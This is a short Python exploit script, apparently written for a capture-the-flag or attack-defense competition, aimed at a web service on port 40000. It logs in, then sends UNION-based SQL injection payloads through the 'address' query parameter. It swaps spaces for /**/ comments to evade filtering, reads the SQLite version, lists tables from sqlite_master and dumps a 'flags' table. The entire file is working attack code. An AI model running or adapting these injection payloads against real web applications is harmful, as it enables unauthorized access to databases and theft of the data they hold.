#!/usr/bin/env python3
import requests
import sys

IP = 'localhost'
if len(sys.argv) > 1:
    IP = sys.argv[1]

s = requests.Session()

resp = s.get(f'http://{IP}:40000/api/login?username=kekus')
print(resp.status_code, resp.text)

hack = lambda x: s.get(f'http://{IP}:40000/api/query', params={'city': 'Мытищи', 'address': x.replace(' ', '/**/')})
resp = hack("' UNION SELECT 1,sqlite_version(),1,1-- ")
print(resp.status_code, resp.text)
resp = hack("' UNION SELECT 1,name,1,1 FROM sqlite_master-- ")
print(resp.status_code, resp.text)
resp = hack("' UNION SELECT 1,*,1,1 FROM flags-- ")
print(resp.status_code, resp.text)
